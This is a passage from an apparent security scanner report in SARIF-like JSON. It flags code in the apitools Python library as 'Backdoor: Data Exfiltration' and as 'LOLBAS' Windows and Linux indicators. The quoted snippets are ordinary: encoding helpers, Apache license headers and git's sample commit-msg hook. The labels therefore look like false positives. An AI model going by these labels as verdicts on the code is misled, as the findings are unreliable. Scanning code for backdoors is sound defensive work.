                      "text": "    value_field = pairs_type.field_by_name('value')\n    value_variant = value_field.variant\n    pairs = getattr(message, source)\n    codec = _ProtoJsonApiTools.Get()\n    for pair in pairs:\n        encoded_value = codec.encode_field(value_field, pair.value)\n        result.set_unrecognized_field(pair.key, encoded_value, value_variant)\n",
                      "markdown": "`    value_field = pairs_type.field_by_name('value')\n    value_variant = value_field.variant\n    pairs = getattr(message, source)\n    codec = _ProtoJsonApiTools.Get()\n    for pair in pairs:\n        encoded_value = codec.encode_field(value_field, pair.value)\n        result.set_unrecognized_field(pair.key, encoded_value, value_variant)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 466,
                  "startColumn": 41,
                  "endLine": 466,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\ndef _EncodeUnknownFields(message):\n    \"\"\"Remap unknown fields in message out of message.source.\"\"\"\n    source = _UNRECOGNIZED_FIELD_MAPPINGS.get(type(message))\n    if source is None:\n        return message\n    # CopyProtoMessage uses _ProtoJsonApiTools, which uses this message. Use\n",
                    "rendered": {
                      "text": "\ndef _EncodeUnknownFields(message):\n    \"\"\"Remap unknown fields in message out of message.source.\"\"\"\n    source = _UNRECOGNIZED_FIELD_MAPPINGS.get(type(message))\n    if source is None:\n        return message\n    # CopyProtoMessage uses _ProtoJsonApiTools, which uses this message. Use\n",
                      "markdown": "`\ndef _EncodeUnknownFields(message):\n    \"\"\"Remap unknown fields in message out of message.source.\"\"\"\n    source = _UNRECOGNIZED_FIELD_MAPPINGS.get(type(message))\n    if source is None:\n        return message\n    # CopyProtoMessage uses _ProtoJsonApiTools, which uses this message. Use\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 436,
                  "startColumn": 30,
                  "endLine": 436,
                  "endColumn": 35,
                  "snippet": {
                    "text": "def _DecodeUnrecognizedFields(message, pair_type):\n    \"\"\"Process unrecognized fields in message.\"\"\"\n    new_values = []\n    codec = _ProtoJsonApiTools.Get()\n    for unknown_field in message.all_unrecognized_fields():\n        # TODO(craigcitro): Consider validating the variant if\n        # the assignment below doesn't take care of it. It may\n",
                    "rendered": {
                      "text": "def _DecodeUnrecognizedFields(message, pair_type):\n    \"\"\"Process unrecognized fields in message.\"\"\"\n    new_values = []\n    codec = _ProtoJsonApiTools.Get()\n    for unknown_field in message.all_unrecognized_fields():\n        # TODO(craigcitro): Consider validating the variant if\n        # the assignment below doesn't take care of it. It may\n",
                      "markdown": "`def _DecodeUnrecognizedFields(message, pair_type):\n    \"\"\"Process unrecognized fields in message.\"\"\"\n    new_values = []\n    codec = _ProtoJsonApiTools.Get()\n    for unknown_field in message.all_unrecognized_fields():\n        # TODO(craigcitro): Consider validating the variant if\n        # the assignment below doesn't take care of it. It may\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 394,
                  "startColumn": 46,
                  "endLine": 394,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# TODO(craigcitro): Fold this and _IncludeFields in as codecs.\ndef _DecodeUnknownFields(message, encoded_message):\n    \"\"\"Rewrite unknown fields in message into message.destination.\"\"\"\n    destination = _UNRECOGNIZED_FIELD_MAPPINGS.get(type(message))\n    if destination is None:\n        return message\n    pair_field = message.field_by_name(destination)\n",
                    "rendered": {
                      "text": "# TODO(craigcitro): Fold this and _IncludeFields in as codecs.\ndef _DecodeUnknownFields(message, encoded_message):\n    \"\"\"Rewrite unknown fields in message into message.destination.\"\"\"\n    destination = _UNRECOGNIZED_FIELD_MAPPINGS.get(type(message))\n    if destination is None:\n        return message\n    pair_field = message.field_by_name(destination)\n",
                      "markdown": "`# TODO(craigcitro): Fold this and _IncludeFields in as codecs.\ndef _DecodeUnknownFields(message, encoded_message):\n    \"\"\"Rewrite unknown fields in message into message.destination.\"\"\"\n    destination = _UNRECOGNIZED_FIELD_MAPPINGS.get(type(message))\n    if destination is None:\n        return message\n    pair_field = message.field_by_name(destination)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 287,
                  "startColumn": 34,
                  "endLine": 287,
                  "endColumn": 39,
                  "snippet": {
                    "text": "def _GetFieldCodecs(field, attr):\n    result = [\n        getattr(_CUSTOM_FIELD_CODECS.get(field), attr, None),\n        getattr(_FIELD_TYPE_CODECS.get(type(field)), attr, None),\n    ]\n    return [x for x in result if x is not None]\n\n",
                    "rendered": {
                      "text": "def _GetFieldCodecs(field, attr):\n    result = [\n        getattr(_CUSTOM_FIELD_CODECS.get(field), attr, None),\n        getattr(_FIELD_TYPE_CODECS.get(type(field)), attr, None),\n    ]\n    return [x for x in result if x is not None]\n\n",
                      "markdown": "`def _GetFieldCodecs(field, attr):\n    result = [\n        getattr(_CUSTOM_FIELD_CODECS.get(field), attr, None),\n        getattr(_FIELD_TYPE_CODECS.get(type(field)), attr, None),\n    ]\n    return [x for x in result if x is not None]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 286,
                  "startColumn": 36,
                  "endLine": 286,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\ndef _GetFieldCodecs(field, attr):\n    result = [\n        getattr(_CUSTOM_FIELD_CODECS.get(field), attr, None),\n        getattr(_FIELD_TYPE_CODECS.get(type(field)), attr, None),\n    ]\n    return [x for x in result if x is not None]\n",
                    "rendered": {
                      "text": "\ndef _GetFieldCodecs(field, attr):\n    result = [\n        getattr(_CUSTOM_FIELD_CODECS.get(field), attr, None),\n        getattr(_FIELD_TYPE_CODECS.get(type(field)), attr, None),\n    ]\n    return [x for x in result if x is not None]\n",
                      "markdown": "`\ndef _GetFieldCodecs(field, attr):\n    result = [\n        getattr(_CUSTOM_FIELD_CODECS.get(field), attr, None),\n        getattr(_FIELD_TYPE_CODECS.get(type(field)), attr, None),\n    ]\n    return [x for x in result if x is not None]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 240,
                  "startColumn": 29,
                  "endLine": 240,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n            def __repr__(self):\n                s = 'TimeZoneOffset(' + repr(self.offset) + ')'\n                if not kwargs.get('no_modules'):\n                    s = 'apitools.base.protorpclite.util.' + s\n                return s\n\n",
                    "rendered": {
                      "text": "\n            def __repr__(self):\n                s = 'TimeZoneOffset(' + repr(self.offset) + ')'\n                if not kwargs.get('no_modules'):\n                    s = 'apitools.base.protorpclite.util.' + s\n                return s\n\n",
                      "markdown": "`\n            def __repr__(self):\n                s = 'TimeZoneOffset(' + repr(self.offset) + ')'\n                if not kwargs.get('no_modules'):\n                    s = 'apitools.base.protorpclite.util.' + s\n                return s\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 227,
                  "startColumn": 17,
                  "endLine": 227,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        return s\n\n    if isinstance(msg, six.string_types):\n        if kwargs.get('shortstrings') and len(msg) > 100:\n            msg = msg[:100]\n\n    if isinstance(msg, datetime.datetime):\n",
                    "rendered": {
                      "text": "        return s\n\n    if isinstance(msg, six.string_types):\n        if kwargs.get('shortstrings') and len(msg) > 100:\n            msg = msg[:100]\n\n    if isinstance(msg, datetime.datetime):\n",
                      "markdown": "`        return s\n\n    if isinstance(msg, six.string_types):\n        if kwargs.get('shortstrings') and len(msg) > 100:\n            msg = msg[:100]\n\n    if isinstance(msg, datetime.datetime):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 211,
                  "startColumn": 21,
                  "endLine": 211,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n    if isinstance(msg, messages.Message):\n        s = type(msg).__name__ + '('\n        if not kwargs.get('no_modules'):\n            s = msg.__module__ + '.' + s\n        names = sorted([field.name for field in msg.all_fields()])\n        for name in names:\n",
                    "rendered": {
                      "text": "\n    if isinstance(msg, messages.Message):\n        s = type(msg).__name__ + '('\n        if not kwargs.get('no_modules'):\n            s = msg.__module__ + '.' + s\n        names = sorted([field.name for field in msg.all_fields()])\n        for name in names:\n",
                      "markdown": "`\n    if isinstance(msg, messages.Message):\n        s = type(msg).__name__ + '('\n        if not kwargs.get('no_modules'):\n            s = msg.__module__ + '.' + s\n        names = sorted([field.name for field in msg.all_fields()])\n        for name in names:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 194,
                  "startColumn": 33,
                  "endLine": 194,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\n    def IndentKwargs(kwargs):\n        kwargs = dict(kwargs)\n        kwargs['indent'] = kwargs.get('indent', 0) + 4\n        return kwargs\n\n    if isinstance(msg, list):\n",
                    "rendered": {
                      "text": "\n    def IndentKwargs(kwargs):\n        kwargs = dict(kwargs)\n        kwargs['indent'] = kwargs.get('indent', 0) + 4\n        return kwargs\n\n    if isinstance(msg, list):\n",
                      "markdown": "`\n    def IndentKwargs(kwargs):\n        kwargs = dict(kwargs)\n        kwargs['indent'] = kwargs.get('indent', 0) + 4\n        return kwargs\n\n    if isinstance(msg, list):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 19,
                  "endLine": 190,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n    # TODO(jasmuth): craigcitro suggests a pretty-printer from apitools/gen.\n\n    indent = kwargs.get('indent', 0)\n\n    def IndentKwargs(kwargs):\n        kwargs = dict(kwargs)\n",
                    "rendered": {
                      "text": "\n    # TODO(jasmuth): craigcitro suggests a pretty-printer from apitools/gen.\n\n    indent = kwargs.get('indent', 0)\n\n    def IndentKwargs(kwargs):\n        kwargs = dict(kwargs)\n",
                      "markdown": "`\n    # TODO(jasmuth): craigcitro suggests a pretty-printer from apitools/gen.\n\n    indent = kwargs.get('indent', 0)\n\n    def IndentKwargs(kwargs):\n        kwargs = dict(kwargs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 29,
                  "endLine": 123,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\ndef JsonToMessage(message_type, message):\n    \"\"\"Convert the given JSON to a message of type message_type.\"\"\"\n    return _ProtoJsonApiTools.Get().decode_message(message_type, message)\n\n\n# TODO(craigcitro): Do this directly, instead of via JSON.\n",
                    "rendered": {
                      "text": "\ndef JsonToMessage(message_type, message):\n    \"\"\"Convert the given JSON to a message of type message_type.\"\"\"\n    return _ProtoJsonApiTools.Get().decode_message(message_type, message)\n\n\n# TODO(craigcitro): Do this directly, instead of via JSON.\n",
                      "markdown": "`\ndef JsonToMessage(message_type, message):\n    \"\"\"Convert the given JSON to a message of type message_type.\"\"\"\n    return _ProtoJsonApiTools.Get().decode_message(message_type, message)\n\n\n# TODO(craigcitro): Do this directly, instead of via JSON.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding_helper.py"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 31,
                  "endLine": 117,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\ndef MessageToJson(message, include_fields=None):\n    \"\"\"Convert the given message to JSON.\"\"\"\n    result = _ProtoJsonApiTools.Get().encode_message(message)\n    return _IncludeFields(result, message, include_fields)\n\n\n",
                    "rendered": {
                      "text": "\ndef MessageToJson(message, include_fields=None):\n    \"\"\"Convert the given message to JSON.\"\"\"\n    result = _ProtoJsonApiTools.Get().encode_message(message)\n    return _IncludeFields(result, message, include_fields)\n\n\n",
                      "markdown": "`\ndef MessageToJson(message, include_fields=None):\n    \"\"\"Convert the given message to JSON.\"\"\"\n    result = _ProtoJsonApiTools.Get().encode_message(message)\n    return _IncludeFields(result, message, include_fields)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/compression_test.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/__init__.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/util_test.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 38,
                  "endLine": 9,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/__init__.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/info/exclude"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 1,
                  "endLine": 1,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                    "rendered": {
                      "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                      "markdown": "`# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 18,
                  "endLine": 21,
                  "endColumn": 23,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 8,
                  "endLine": 21,
                  "endColumn": 14,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 1,
                  "endLine": 21,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 1,
                  "endLine": 16,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                    "rendered": {
